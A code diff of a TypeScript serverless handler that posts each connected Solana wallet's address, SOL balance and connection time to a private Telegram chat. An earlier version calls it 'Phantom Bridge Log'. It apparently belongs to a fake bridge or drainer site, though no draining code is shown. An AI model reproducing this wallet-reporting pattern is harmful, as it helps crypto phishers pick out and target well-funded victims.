@@ -1,4 +1,3 @@
-// /api/tg-log.ts
 import type { VercelRequest, VercelResponse } from "@vercel/node";
 
 export default async function handler(req: VercelRequest, res: VercelResponse) {
@@ -7,28 +6,39 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
   }
 
   try {
-    const { address, solBalance, connectedAtISO } = req.body || {};
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+    if (!token || !chatId) {
+      return res.status(500).json({ ok: false, error: "Missing env vars" });
+    }
 
-    // İstanbul saatine çevir
+    const body =
+      typeof req.body === "string"
+        ? JSON.parse(req.body || "{}")
+        : (req.body || {});
+    const { address, solBalance, connectedAtISO } = body;
+
+    // İstanbul saatine çevir (dd.MM - HH:mm)
     const connectedTR = new Intl.DateTimeFormat("tr-TR", {
       timeZone: "Europe/Istanbul",
-      dateStyle: "short",
-      timeStyle: "medium",
+      day: "2-digit",
+      month: "2-digit",
+      hour: "2-digit",
+      minute: "2-digit",
     }).format(new Date(connectedAtISO || Date.now()));
 
+    // Mesaj formatı
     const text =
-      `🔗 <b>Phantom Bridge Log</b>\n` +
-      `👛 <b>Cüzdan:</b> <code>${address}</code>\n` +
-      `⏰ <b>Zaman (TR):</b> ${connectedTR}\n` +
-      `💰 <b>SOL:</b> ${solBalance}`;
+      `wallet: ${address}\n` +
+      `time: ${connectedTR}\n` +
+      `balance: ${solBalance} SOL`;
 
-    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
-
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
     const tg = await fetch(url, {
       method: "POST",
       headers: { "content-type": "application/json" },
       body: JSON.stringify({
-        chat_id: process.env.TELEGRAM_CHAT_ID,
+        chat_id: chatId,
         text,
         parse_mode: "HTML",
         disable_web_page_preview: true,
@@ -42,8 +52,8 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     }
 
     return res.status(200).json({ ok: true });
-  } catch (e) {
-    console.error(e);
-    return res.status(500).json({ ok: false });
+  } catch (e: any) {
+    console.error("Handler error:", e);
+    return res.status(500).json({ ok: false, error: e?.message });
   }
 }
